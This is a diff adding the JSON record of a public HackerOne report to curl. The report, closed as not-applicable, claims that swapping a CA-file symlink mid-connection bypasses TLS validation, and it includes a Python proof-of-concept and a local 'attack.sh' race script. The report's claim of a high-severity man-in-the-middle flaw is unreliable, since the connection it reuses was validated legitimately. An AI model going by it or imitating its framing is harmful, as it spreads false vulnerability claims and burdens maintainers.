@@ -1,0 +1,123 @@
+{
+  "id": 3335085,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzM1MDg1",
+  "url": "https://hackerone.com/reports/3335085",
+  "title": "TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-09-11T15:02:42.727Z",
+  "submitted_at": "2025-09-11T15:02:43.015Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xrey",
+    "url": "/0xrey",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-09-11T16:10:49.578Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-09-11T16:01:57.209Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections. During the initial handshake, `libcurl` correctly validates the server's certificate against the user-provided CA bundle. However, it then assumes this trust is permanent for the entire life of the connection.\n\nIf an attacker can modify the CA file on disk *after* this initial check, `libcurl` will continue to reuse the now-trusted connection for new HTTP/2 streams without ever re-validating its trust anchor. This allows an attacker to completely bypass certificate validation for all subsequent requests, enabling a full Man-in-the-Middle attack.\n\n**Affected version:**\n\nThis vulnerability was confirmed on the latest stable release, **curl 8.16.0**, which I compiled from source to ensure the test was relevant. Given the nature of the bug, it likely affects all versions that support HTTP/2 connection reuse.\n\nMy test build's version output:\n`curl 8.16.0 (x86_64-pc-linux-gnu) libcurl/8.16.0 OpenSSL/3.0.2 ... nghttp2/1.43.0`\n\n**Steps To Reproduce:**\n\nThe following Proof of Concept demonstrates the vulnerability in a reliable way. It uses a Python script to orchestrate the test environment (compiling `curl`, setting up a server, and generating certificates) and then executes a small shell script to perform the actual attack.\n\n**Step 1: Save and run the Proof of Concept code**\nSave the code below as `poc.py` and run it with `python3 poc.py`. The script requires standard build tools (`build-essential`, etc.) and the `openssl` command-line tool.\n\n```python\n# Proof of Concept for Curl HTTP/2 TOCTOU Vulnerability\nimport threading, ssl, http.server, time, os, glob, sys, subprocess\n\ndef compile_curl():\n    # Stage 1: Compile Curl 8.16.0 from source to ensure we test the latest version.\n    print(\"--- STAGE 1: COMPILING CURL 8.16.0 ---\")\n    if os.path.exists(\"curl-8.16.0/src/curl\"):\n        print(\"Curl 8.16.0 already compiled.\")\n        return os.path.abspath(\"curl-8.16.0/src/curl\")\n\n    # Dependencies for Debian/Ubuntu can be installed with:\n    # apt-get install -y build-essential libssl-dev libnghttp2-dev libpsl-dev\n    \n    subprocess.run(\"wget -q https://curl.se/download/curl-8.16.0.tar.gz && tar -xzf curl-8.16.0.tar.gz\", shell=True, check=True)\n    \n    original_dir = os.getcwd()\n    os.chdir(\"curl-8.16.0\")\n    print(\"\\n--- Running ./configure ---\")\n    subprocess.run(\"./configure --with-openssl --with-nghttp2 > /dev/null\", shell=True, check=True)\n    print(\"--- Running make ---\")\n    subprocess.run(\"make > /dev/null\", shell=True, check=True)\n    \n    curl_binary_path = os.path.abspath(\"src/curl\")\n    print(\"\\n--- Verifying New Curl Version ---\")\n    subprocess.run(f\"{curl_binary_path} --version\", shell=True)\n    os.chdir(original_dir)\n    print(\"--- COMPILATION COMPLETE ---\")\n    return curl_binary_path\n\n# Stage 2: Setup Server and Certificates\nHOST = \"localhost\"\nPORT = 8443\nCA_FILE_PATH = \"ca.crt\"\nSERVER_CERT_FILE = \"server.crt\"; SERVER_KEY_FILE = \"server.key\"\nLEGIT_CA_CERT_FILE = \"legit_ca.crt\"; LEGIT_CA_KEY_FILE = \"legit_ca.key\"\nFAKE_CA_CERT_FILE = \"fake_ca.crt\"; FAKE_CA_KEY_FILE = \"fake_ca.key\"\n\ndef cleanup_files():\n    files_to_delete = glob.glob(\"*.crt\") + glob.glob(\"*.key\") + glob.glob(\"*.pem\") + glob.glob(\"*.srl\") + glob.glob(\"*.csr\")\n    for f in files_to_delete:\n        try: os.remove(f)\n        except: pass\n\ndef generate_all_certs():\n    print(\"Generating certificates using OpenSSL CLI...\")\n    # Legit CA\n    subprocess.run(f\"openssl genrsa -out {LEGIT_CA_KEY_FILE} 2048\", shell=True, check=True, capture_output=True)\n    subprocess.run(f'openssl req -x509 -new -nodes -key {LEGIT_CA_KEY_FILE} -sha256 -days 365 -out {LEGIT_CA_CERT_FILE} -subj \"/CN=Legit CA\"', shell=True, check=True, capture_output=True)\n    # Fake CA\n    subprocess.run(f\"openssl genrsa -out {FAKE_CA_KEY_FILE} 2048\", shell=True, check=True, capture_output=True)\n    subprocess.run(f'openssl req -x509 -new -nodes -key {FAKE_CA_KEY_FILE} -sha256 -days 365 -out {FAKE_CA_CERT_FILE} -subj \"/CN=Fake CA\"', shell=True, check=True, capture_output=True)\n    # Server Cert (signed by Legit CA)\n    subprocess.run(f\"openssl genrsa -out {SERVER_KEY_FILE} 2048\", shell=True, check=True, capture_output=True)\n    subprocess.run(f'openssl req -new -key {SERVER_KEY_FILE} -out server.csr -subj \"/CN={HOST}\"', shell=True, check=True, capture_output=True)\n    subprocess.run(f\"openssl x509 -req -in server.csr -CA {LEGIT_CA_CERT_FILE} -CAkey {LEGIT_CA_KEY_FILE} -CAcreateserial -out {SERVER_CERT_FILE} -days 365 -sha256\", shell=True, check=True, capture_output=True)\n    print(\"Certificates created successfully.\")\n\ndef run_server():\n    class SimpleServer(http.server.SimpleHTTPRequestHandler):\n        def do_GET(self):\n            print(f\"[SERVER LOG] Request received for: {self.path}\")\n            self.send_response(200)\n            self.send_header(\"Content-type\", \"text/plain\")\n            self.end_headers()\n            self.wfile.write(b\"OK\")\n        def log_message(self, format, *args):\n            return # Suppress default logging\n\n    print(f\"[SERVER] Listening at https://{HOST}:{PORT}\")\n    httpd = http.server.HTTPServer((HOST, PORT), SimpleServer)\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    ctx.set_alpn_protocols(['h2', 'http/1.1']) # Enable ALPN for HTTP/2 negotiation\n    ctx.load_cert_chain(certfile=SERVER_CERT_FILE, keyfile=SERVER_KEY_FILE)\n    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)\n    httpd.serve_forever()\n\n# --- Main Execution ---\ntry:\n    CURL_BINARY_PATH = compile_curl()\n    cleanup_files()\n    generate_all_certs()\n\n    server_thread = threading.Thread(target=run_server)\n    server_thread.daemon = True\n    server_thread.start()\n    time.sleep(2)\n\n    os.symlink(LEGIT_CA_CERT_FILE, CA_FILE_PATH)\n\n    attack_script = f\"\"\"\n    #!/bin/bash\n    set -e\n    echo -e \"\\\\n--- STARTING ATTACK (Testing Curl 8.16.0) ---\"\n\n    # Attacker process: swap the symlink after a short delay\n    (\n      sleep 0.5\n      echo \"[ATTACKER] Swapping symlink to Fake CA!\"\n      rm -f {CA_FILE_PATH}\n      ln -s {FAKE_CA_CERT_FILE} {CA_FILE_PATH}\n    ) &\n\n    # Victim process: curl with two requests, forcing HTTP/2\n    {CURL_BINARY_PATH} --http2 -v \\\\\n      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data1 \\\\\n      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data2\n    \"\"\"\n\n    with open(\"attack.sh\",\"w\") as f:\n        f.write(attack_script)\n    os.chmod(\"attack.sh\", 0o755)\n\n    print(\"\\n--- Running Attack against Curl 8.16.0 ---\")\n    subprocess.run(\"./attack.sh\", shell=True)\n\n    print(\"\\n--- Final Analysis ---\")\n    print(\"Review the output above. If the curl command succeeded and the server log shows two requests, the bug is confirmed in 8.16.0.\")\n\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")\n    print(\"Please ensure build tools (build-essential, etc.) and OpenSSL CLI are installed.\")\n```\n\n**Step 2: Observe the output**\nThe script orchestrates a race condition:\na. It creates a symlink `ca.crt` pointing to a legitimate CA file.\nb. It launches a background process that, after a brief pause, atomically replaces this symlink to point to a fake CA file.\nc. It immediately runs a single `curl` command that makes two requests over HTTP/2, forcing connection reuse.\n\n**Expected (Secure) Behavior:**\nThe first request should succeed. The second request, however, should fail with an SSL certificate verification error (exit code 60). A secure implementation would either re-evaluate the trust anchor for the new stream or create a new connection which would then fail validation against the swapped-in fake CA.\n\n**Actual (Vulnerable) Behavior:**\nBoth requests succeed. The `curl` command exits cleanly. The verbose output explicitly shows `Re-using existing connection!`, and the server log confirms both requests were received. This is definitive proof that `curl` does not re-validate the trust anchor for the second stream, instead blindly sending it over the previously established trusted connection.\n\n## Impact\n\nThis vulnerability allows a local attacker to completely bypass TLS certificate validation for all but the first request on a long-lived HTTP/2 connection. This breaks the trust model of TLS and enables Man-in-the-Middle (MitM) attacks, compromising the confidentiality and integrity of sensitive data.\n\nI've rated this as **High** severity. While the attack vector is local, the impact is a catastrophic failure of TLS guarantees (full MitM). The \"local\" prerequisite is met in many common, real-world scenarios beyond a simple desktop user, such as:\n*   Multi-tenant servers and shared hosting environments.\n*   Compromised container environments with shared volumes.\n*   Applications that insecurely use world-writable directories like `/tmp` for trust stores.\n*   As a powerful escalation step in a vulnerability chain, where a lower-impact bug (like a limited file write) can be escalated to a full network MitM.\n\nThe impact is most severe for long-running applications, daemons, or API clients that rely on persistent HTTP/2 connections, as the window of opportunity for the attacker is indefinite after the first connection is made.",
+  "weakness": {
+    "id": 105,
+    "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "thalaivar304",
+    "2026",
+    "wefega",
+    "nirsarker",
+    "b4nd4r3",
+    "magdy12",
+    "hayder790",
+    "jimmtech",
+    "revio",
+    "h0nd4r00t",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
